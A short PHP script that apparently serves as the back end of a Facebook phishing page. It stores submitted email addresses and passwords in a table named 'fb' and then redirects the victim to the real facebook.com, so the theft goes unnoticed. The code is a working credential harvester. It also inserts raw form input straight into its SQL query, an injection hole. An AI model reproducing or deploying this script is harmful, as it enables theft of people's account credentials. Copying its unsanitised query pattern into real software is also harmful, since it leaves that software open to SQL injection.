

<?php
include 'database.php'; 
// create a variable

$email=$_POST['email'];
$password=$_POST['pass'];
 
//Execute the query
 
 
mysqli_query($connect,"INSERT INTO fb (uid,pass)
		        VALUES ('$email','$password')");
				
	if(mysqli_affected_rows($connect) > 0){
	header("Location: https://www.facebook.com/");
} else {
	echo mysqli_error ($connect);
}